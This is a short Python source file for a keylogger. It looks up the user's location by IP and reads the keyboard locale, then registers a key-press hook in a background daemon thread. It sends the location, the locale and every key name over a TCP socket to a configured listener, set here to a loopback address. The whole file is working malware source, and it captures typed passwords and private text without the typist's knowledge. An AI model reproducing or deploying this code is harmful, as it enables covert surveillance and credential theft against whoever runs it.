import socket
import geocoder
import keyboard
import locale
import time
import threading
CONN_HOST = "127.0.0.89"  # Standard loopback interface address (localhost)
CONN_PORT = 65230  # Port to listen on (non-privileged ports are > 1023) <[OK] Ipinfo - Geocode [Banská Bystrica, Banskobystrický kraj, SK]>
USER_GEOLOCATION = str(geocoder.ip('me'))

print(USER_GEOLOCATION[24:-2])


#! Listens for key presses and sends them to the server
def start_keylogger():
        global keyThread
        keyThread = threading.Thread(target=create_keylogger)
        keyThread.daemon = True
        keyThread.start()
        

def create_keylogger():
    print("Called the function")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CONN_HOST,CONN_PORT))
        s.send(bytes(USER_GEOLOCATION[24:-2], 'utf-8'))
        time.sleep(0.5)
        s.send(f'Keyboard: {locale.getdefaultlocale()[0]}'.encode('utf-8'))
        while True:
            try:
                 keyboard.on_press(lambda e: s.send(f'Key: {e.name}'.encode("utf-8")))
            except Exception as e:
                 print("Keylogger error")
                 #print(f"Keylogger Error: {e}")
            keyboard.wait()